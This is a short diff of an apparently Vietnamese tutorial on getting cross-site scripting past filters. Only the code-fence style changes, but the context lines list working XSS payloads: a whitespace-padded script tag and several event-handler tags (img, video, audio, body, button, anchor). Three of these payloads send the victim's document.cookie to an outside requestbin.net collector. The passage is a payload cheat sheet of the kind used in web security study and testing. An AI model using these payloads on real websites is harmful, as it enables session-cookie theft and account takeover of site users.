@@ -47,13 +47,13 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 ### Lọc thẻ script
 * Insert thêm ký tự trình duyệt hay bỏ qua (Tab, escape)
 
-```
+~~~js
 <script  >alert(1);</script   >
-```
+~~~
 
 * Không dùng thẻ script
 
-```
+~~~js
 <img src=x onerror=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>
 <video src=1 onerror=alert(1)>
 <audio src=1 onerror=alert(1)>
@@ -64,5 +64,5 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 <BODY ONLOAD=alert('XSS')>
 <button autofocus onfocus=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)></button>
 <a onmouseover=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>xxs link</a>
-```
+~~~
 
